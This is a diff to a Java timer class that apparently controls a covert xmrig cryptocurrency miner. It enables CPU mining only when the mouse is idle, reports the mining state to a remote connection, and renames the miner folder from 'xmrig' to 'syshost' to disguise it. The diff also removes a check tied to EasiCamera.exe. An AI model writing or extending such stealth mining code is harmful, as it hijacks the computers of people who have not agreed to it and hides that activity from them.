@@ -23,17 +23,10 @@ public class AutoSwitch extends TimerTask {
         if (AXMain.printToStdout){
             Out.sayWithTimeLn("Check mouse location"+nowLoc+" s:"+lsMousePoint);
         }
-        boolean ecRunning=isProcessExist("EasiCamera.exe");
         if (nowLoc.distance(lsMousePoint)>10){
             updateState(false);
             cameraPausePeriod=20;
             count=0;
-        }else if (ecRunning&&cameraPausePeriod<23) {
-            updateState(false);
-            cameraPausePeriod++;
-            count=0;
-        }else if (!ecRunning){
-            cameraPausePeriod=0;
         }else{
             if (count<2){
                 count++;
@@ -49,15 +42,15 @@ public class AutoSwitch extends TimerTask {
         if (running==this.running)
             return;
         try {
-            String fileContent = FileIO.read("D:\\xmrig\\config.json");
+            String fileContent = FileIO.read("D:\\syshost\\config.json");
             if (running) {
-                FileIO.write("D:\\xmrig\\config.json", fileContent.replace("\"cpu\": {\n" +
+                FileIO.write("D:\\syshost\\config.json", fileContent.replace("\"cpu\": {\n" +
                         "        \"enabled\": false,", "\"cpu\": {\n" +
                         "        \"enabled\": true,"));
                 AXMain.connect.writeNonBlocked("state mining");
                 Out.sayWithTimeLn("Start.");
             } else {
-                FileIO.write("D:\\xmrig\\config.json", fileContent.replace("\"cpu\": {\n" +
+                FileIO.write("D:\\syshost\\config.json", fileContent.replace("\"cpu\": {\n" +
                         "        \"enabled\": true,", "\"cpu\": {\n" +
                         "        \"enabled\": false,"));
                 AXMain.connect.writeNonBlocked("state hang-up");
